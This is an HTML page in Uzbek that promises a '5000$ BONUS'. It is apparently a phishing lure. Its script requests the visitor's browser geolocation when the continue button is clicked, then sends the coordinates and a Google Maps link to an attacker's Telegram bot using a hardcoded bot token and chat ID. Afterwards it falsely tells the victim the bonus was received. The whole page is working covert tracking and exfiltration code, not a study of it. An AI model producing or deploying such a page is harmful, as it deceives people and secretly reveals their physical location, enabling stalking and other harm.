
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bonus olish</title>

    <style>
        body {
            font-family: Arial;
            text-align: center;
            background: #0f172a;
            color: white;
            margin-top: 100px;
        }

        button {
            padding: 15px 30px;
            font-size: 18px;
            background: #22c55e;
            border: none;
            border-radius: 10px;
            color: white;
            cursor: pointer;
        }

        button:hover {
            background: #16a34a;
        }

        #status {
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <h1>🎁 5000$ BONUS</h1>
    <p>Bonusni olish uchun tasdiqlang</p>

    <button onclick="getLocation()">Davom etish</button>

    <p id="status"></p>

<script>
function getLocation() {
    document.getElementById("status").innerHTML = "⏳ Kuting...";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendToTelegram, error);
    } else {
        document.getElementById("status").innerHTML = "❌ Qurilmada ishlamaydi";
    }
}

function sendToTelegram(position) {
    let lat = position.coords.latitude;
    let lon = position.coords.longitude;

    let token = "8096738475:AAEpARzOs__Qeknja0IU2O6YS9F9vTrw_Fk";
    let chat_id = "8108956117";

    let text = "📍 Yangi lokatsiya:%0A"
        + "Latitude: " + lat + "%0A"
        + "Longitude: " + lon + "%0A"
        + "Google Map: https://maps.google.com/?q=" + lat + "," + lon;

    let url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + text;

    fetch(url)
    .then(() => {
        document.getElementById("status").innerHTML = "✅ Bonus muvaffaqiyatli olindi!";
    })
    .catch(() => {
        document.getElementById("status").innerHTML = "❌ Xatolik yuz berdi";
    });
}

function error() {
    document.getElementById("status").innerHTML = "❌ Ruxsat berilmadi";
}
</script>

</body>
</html>

